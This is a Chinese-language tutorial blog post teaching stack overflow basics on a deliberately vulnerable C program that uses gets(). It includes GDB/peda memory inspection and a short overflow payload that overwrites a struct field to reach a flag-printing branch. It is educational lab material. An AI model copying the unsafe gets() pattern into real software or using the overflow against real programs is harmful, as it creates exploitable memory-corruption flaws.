---
id: 776
layout: post
title: '二进制安全之栈溢出（一）'
date: 2017-10-20 10:46:07
author: virusdefender
tags: 安全 CTF 二进制
---

首先假设已经有了C语言的基础知识，了解变量和指针。暂时不需要懂汇编和内存栈结构。

## 安装 peda

peda 是 GDB 的一个插件，提供了很多方便我们调试和漏洞利用的功能。源码和安装方式在 [https://github.com/longld/peda](https://github.com/longld/peda)

下面的代码我也忘了来源了，反正是充满了暴力气息的一段代码。

```clike
#include <stdio.h>

struct Student {
    char name[8];
    char s;
    int birth;
};

int main(int argc, char **argv) {
    struct Student student;
    student.s = 'c';
    printf("What's Your Birth?\n");
    scanf("%d", &student.birth);
    while (getchar() != '\n') ;
    if (student.birth == 1926) {
        printf("You Cannot Born In 1926!\n");
        return 0;
    }
    printf("What's Your Name?\n");
    gets(student.name);
    printf("You Are Born In %d\n", student.birth);
    if (student.birth == 1926) {
        printf("You Shall Have Flag.\n");
        system("cat flag");
    } else {
        printf("You Are Naive.\n");
        printf("You Speed One Second Here.\n");
    }
    return 0;
}

```

`gcc -g -O0 -o vuln main.c` 编译

## GDB调试指令

```
sudo gdb ./vuln
```

如果成功安装了peda，就可以看到 `gdb-peda$` 的提示了。

常用的指令就不多说了，比如 `list` `b` 等。

通过 `list` 浏览了代码，就可以使用 `b $line_number` 的方式下断点了，比如想让代码停在 14 行，然后看 `student` 变量的内存分布，那我们可以输入`b 14`。

通过 `info breakpoints` 可以看到所有的断点。

`r` 指令是运行这个调试程序，然后看到进程成功的停在了我们的断点处。

```
gdb-peda$ r

...

Breakpoint 1, main (argc=0x1, argv=0x7fffffffe568) at main.c:14
14	    printf("What's Your Birth?\n");
```

至于上面的一堆汇编输出，我们后面再说。

## 万物皆可print

下断点就是为了查看 `student` 结构体的内存分布，C 语言里面很多函数在这里也是类似的用法的。

```
gdb-peda$ p sizeof(student)
$9 = 0x10
gdb-peda$ p sizeof(student.birth)
$10 = 0x4
gdb-peda$ p sizeof(student.name)
$11 = 0x8
gdb-peda$ p sizeof(student.s)
$12 = 0x1
```

可以看到 `student` 结构体是 16 个字节大小，至于为什么是 16 个字节，而不是 8+1+4=13 个字节呢？

那是因为 `s` 成员是 `char` 类型的，一个字节，然后计算机为了加快内存访问速度进行了内存对齐操作，把 `s` 所在的内存补全为了 4 个字节，关于内存对齐，可以参考 https://github.com/ludx/The-Lost-Art-of-C-Structure-Packing

## 查看内存地址

这里也是类似c语言里面的取地址符号，我们查看 `student` 和它三个成员的内存地址。

```
gdb-peda$ p &student
$1 = (struct Student *) 0x7fffffffe460
gdb-peda$ p &(student.name)
$2 = (char (*)[8]) 0x7fffffffe460
gdb-peda$ p &(student.s)
$3 = 0x7fffffffe468 "c\006@"
gdb-peda$ p &(student.birth)
$4 = (int *) 0x7fffffffe46c
```

可以看到 `student` 结构体和 `student.name` 起始内存地址都是 `0x7fffffffe460`，然后`student.name` 占用 8 个字节，`student.s` 起始地址就是 `0x7fffffffe468` 了，然后因为 4 字节补全，`student.birth`的起始内存地址就是 `0x7fffffffe46c` 了。

## 查看指定的内存地址的数据

这里使用的是 `x` 指令，它有三个可选参数 `x/<n/f/u> $addr`

`n` 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的 `u` 定义。

`f` 表示显示的格式，比如 `x` 按十六进制格式显示变量, `d` 是按十进制格式显示变量。

`u` 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。`u`参数可以用下面的字符来代替，`b` 表示单字节，`h` 表示双字节，`w` 表示四字节，`g` 表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。

为了打印 `student` 结构体的内存分布，先在第 24 行下断点，然后让进程继续执行直到下一个断点。

```
gdb-peda$ b 24
Breakpoint 2 at 0x4007b1: file main.c, line 24.
gdb-peda$ c
Continuing.
What's Your Birth?
1925
What's Your Name?
AAAAAAA
You Are Born In 1925

......

reakpoint 2, main (argc=0x1, argv=0x7fffffffe568) at main.c:24
24	    if (student.birth == 1926) {
```

然后就可以

```
gdb-peda$ x/16xb &student
0x7fffffffe460:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x00
0x7fffffffe468:	0x63	0x06	0x40	0x00	0x85	0x07	0x00	0x00

gdb-peda$ x/4xw &student
0x7fffffffe460:	0x41414141	0x41414141	0x41414141	0x00000785
```

前 7 个字节就是字母 `A` 的 ASCII `0x41`，然后是 `0xx` 字符串结尾，然后是代码中写死的 `c` 字母，然后跳过三个字节之后还剩四个字节，就是一个 `int` 数字。

从最后四个字节分布可以看出来，对于 `int 0x00000785` 这种多字节变量，它们的低字节在内存低地址处，高字节在内存高地址处，这种分布方式成为小端序，还有的机器是反过来的，叫做大端序。对于 `char` 这种单字节变量和`student.name` 这种数组来说，没有大小端的问题，

## 分析内存结构

这里问题就很清晰了，`student.name` 数组没有限制长度，如果我们输入超过 7 位的话，多出来的内容将覆盖 `student.s` 的内存，如果输入再长的话，就会覆盖 `student.birth`的内存空间。所以我们可以确定 `student.name` 的输入长度是 16 字节，前面 14 字节可以是任意构造，只要认真构造最后两个字节，让 `student.birth` 的内存为 `0x00000786` 就可以，所以我们构造的payload就是`AAAAAAAAAAAA\x86\x07`

然后这种特殊的字符我们都可以使用 Python 输入到文件中，然后重定向输入的

```
➜  Desktop python -c "print '1234\nAAAAAAAAAAAA\x86\x07\n'" > 1.in
➜  Desktop ./vuln < 1.in
What's Your Birth?
What's Your Name?
You Are Born In 1926
You Shall Have Flag.
cat: flag: No such file or directory
```

GDB也可以使用这种重定向输入的

```
gdb-peda$ b 24
Breakpoint 1 at 0x4007b1: file main.c, line 24.
gdb-peda$ r < 1.in
Starting program: /home/virusdefender/Desktop/pwn/1/main < 1.in
What's Your Birth?
What's Your Name?
You Are Born In 1926

···

Breakpoint 1, main (argc=0x1, argv=0x7fffffffe568) at main.c:24
24	    if (student.birth == 1926) {
gdb-peda$ x/16xb &student
0x7fffffffe460:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe468:	0x41	0x41	0x41	0x41	0x86	0x07	0x00	0x00
```

可以看到我们控制了 `student` 的内存，让代码进入了指定的分支。

